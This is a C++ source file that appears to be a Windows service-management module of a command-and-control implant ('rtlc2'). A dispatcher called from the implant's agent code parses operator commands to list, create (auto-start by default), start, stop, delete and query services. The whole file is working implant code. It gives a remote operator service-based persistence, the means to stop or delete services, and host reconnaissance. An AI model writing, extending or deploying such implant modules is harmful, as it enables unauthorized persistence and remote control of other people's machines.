#include <string>
#include <sstream>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#pragma comment(lib, "advapi32.lib")
#endif

namespace rtlc2 { namespace modules {

#ifdef _WIN32

std::string ServiceList() {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) return "Error: OpenSCManager failed (code " + std::to_string(GetLastError()) + ")";

    DWORD needed = 0, count = 0, resume = 0;
    EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                          nullptr, 0, &needed, &count, &resume, nullptr);

    std::vector<BYTE> buf(needed);
    if (!EnumServicesStatusExW(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL,
                               buf.data(), needed, &needed, &count, &resume, nullptr)) {
        CloseServiceHandle(hSCM);
        return "Error: EnumServicesStatusEx failed";
    }

    auto* services = reinterpret_cast<ENUM_SERVICE_STATUS_PROCESSW*>(buf.data());
    std::ostringstream ss;
    ss << "Services (" << count << " total):\n\n";

    for (DWORD i = 0; i < count && i < 200; ++i) {
        char name[256], display[256];
        WideCharToMultiByte(CP_UTF8, 0, services[i].lpServiceName, -1, name, sizeof(name), nullptr, nullptr);
        WideCharToMultiByte(CP_UTF8, 0, services[i].lpDisplayName, -1, display, sizeof(display), nullptr, nullptr);

        const char* state = "Unknown";
        switch (services[i].ServiceStatusProcess.dwCurrentState) {
            case SERVICE_RUNNING: state = "Running"; break;
            case SERVICE_STOPPED: state = "Stopped"; break;
            case SERVICE_PAUSED:  state = "Paused"; break;
            case SERVICE_START_PENDING: state = "Starting"; break;
            case SERVICE_STOP_PENDING:  state = "Stopping"; break;
        }

        ss << name << " | " << display << " | " << state
           << " | PID:" << services[i].ServiceStatusProcess.dwProcessId << "\n";
    }

    CloseServiceHandle(hSCM);
    return ss.str();
}

std::string ServiceCreate(const std::string& name, const std::string& displayName,
                          const std::string& binPath, const std::string& startType) {
    SC_HANDLE hSCM = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) return "Error: OpenSCManager failed (code " + std::to_string(GetLastError()) + ")";

    DWORD dwStart = SERVICE_DEMAND_START;
    if (startType == "auto") dwStart = SERVICE_AUTO_START;
    else if (startType == "disabled") dwStart = SERVICE_DISABLED;
    else if (startType == "boot") dwStart = SERVICE_BOOT_START;

    SC_HANDLE hSvc = CreateServiceA(hSCM, name.c_str(), displayName.c_str(),
                                     SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                                     dwStart, SERVICE_ERROR_NORMAL, binPath.c_str(),
                                     nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!hSvc) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        return "Error: CreateService failed (code " + std::to_string(err) + ")";
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return "OK: Service '" + name + "' created successfully";
}

std::string ServiceStart(const std::string& name) {
    SC_HANDLE hSCM = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return "Error: OpenSCManager failed";

    SC_HANDLE hSvc = OpenServiceA(hSCM, name.c_str(), SERVICE_START);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return "Error: OpenService failed for '" + name + "'";
    }

    BOOL ok = StartServiceA(hSvc, 0, nullptr);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    return ok ? "OK: Service '" + name + "' started"
              : "Error: StartService failed (code " + std::to_string(GetLastError()) + ")";
}

std::string ServiceStop(const std::string& name) {
    SC_HANDLE hSCM = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return "Error: OpenSCManager failed";

    SC_HANDLE hSvc = OpenServiceA(hSCM, name.c_str(), SERVICE_STOP);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return "Error: OpenService failed for '" + name + "'";
    }

    SERVICE_STATUS status;
    BOOL ok = ControlService(hSvc, SERVICE_CONTROL_STOP, &status);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    return ok ? "OK: Service '" + name + "' stopped"
              : "Error: ControlService(STOP) failed (code " + std::to_string(GetLastError()) + ")";
}

std::string ServiceDelete(const std::string& name) {
    SC_HANDLE hSCM = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return "Error: OpenSCManager failed";

    SC_HANDLE hSvc = OpenServiceA(hSCM, name.c_str(), DELETE | SERVICE_STOP);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return "Error: OpenService failed for '" + name + "'";
    }

    // Try to stop first
    SERVICE_STATUS status;
    ControlService(hSvc, SERVICE_CONTROL_STOP, &status);

    BOOL ok = DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    return ok ? "OK: Service '" + name + "' deleted"
              : "Error: DeleteService failed (code " + std::to_string(GetLastError()) + ")";
}

std::string ServiceConfig(const std::string& name) {
    SC_HANDLE hSCM = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) return "Error: OpenSCManager failed";

    SC_HANDLE hSvc = OpenServiceA(hSCM, name.c_str(), SERVICE_QUERY_CONFIG | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return "Error: OpenService failed for '" + name + "'";
    }

    DWORD needed = 0;
    QueryServiceConfigA(hSvc, nullptr, 0, &needed);
    std::vector<BYTE> buf(needed);
    auto* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGA*>(buf.data());

    if (!QueryServiceConfigA(hSvc, cfg, needed, &needed)) {
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSCM);
        return "Error: QueryServiceConfig failed";
    }

    SERVICE_STATUS_PROCESS ssp;
    DWORD sNeeded;
    QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, reinterpret_cast<BYTE*>(&ssp),
                         sizeof(ssp), &sNeeded);

    std::ostringstream ss;
    ss << "Service: " << name << "\n"
       << "Display Name: " << (cfg->lpDisplayName ? cfg->lpDisplayName : "") << "\n"
       << "Binary Path: " << (cfg->lpBinaryPathName ? cfg->lpBinaryPathName : "") << "\n"
       << "Start Type: " << cfg->dwStartType << "\n"
       << "Service Type: " << cfg->dwServiceType << "\n"
       << "Account: " << (cfg->lpServiceStartName ? cfg->lpServiceStartName : "LocalSystem") << "\n"
       << "PID: " << ssp.dwProcessId << "\n"
       << "State: " << ssp.dwCurrentState << "\n";

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return ss.str();
}

#else // POSIX

std::string ServiceList() { return "Service operations only available on Windows"; }
std::string ServiceCreate(const std::string&, const std::string&, const std::string&, const std::string&) { return "Service operations only available on Windows"; }
std::string ServiceStart(const std::string&) { return "Service operations only available on Windows"; }
std::string ServiceStop(const std::string&) { return "Service operations only available on Windows"; }
std::string ServiceDelete(const std::string&) { return "Service operations only available on Windows"; }
std::string ServiceConfig(const std::string&) { return "Service operations only available on Windows"; }

#endif

}} // namespace rtlc2::modules

// Dispatcher called from agent.cpp via extern declaration
namespace rtlc2 {
std::string ServiceCommand(const std::string& action, const std::string& args) {
    if (action == "list")   return rtlc2::modules::ServiceList();
    if (action == "start")  return rtlc2::modules::ServiceStart(args);
    if (action == "stop")   return rtlc2::modules::ServiceStop(args);
    if (action == "delete") return rtlc2::modules::ServiceDelete(args);
    if (action == "config") return rtlc2::modules::ServiceConfig(args);
    if (action == "create") {
        // args format: "name|displayName|binPath|startType"
        auto p1 = args.find('|');
        auto p2 = args.find('|', p1 + 1);
        auto p3 = args.find('|', p2 + 1);
        if (p1 == std::string::npos || p2 == std::string::npos)
            return "Error: create requires name|displayName|binPath[|startType]";
        std::string name = args.substr(0, p1);
        std::string display = args.substr(p1 + 1, p2 - p1 - 1);
        std::string binPath = args.substr(p2 + 1, (p3 != std::string::npos) ? p3 - p2 - 1 : std::string::npos);
        std::string startType = (p3 != std::string::npos) ? args.substr(p3 + 1) : "auto";
        return rtlc2::modules::ServiceCreate(name, display, binPath, startType);
    }
    return "Unknown service action: " + action;
}
} // namespace rtlc2
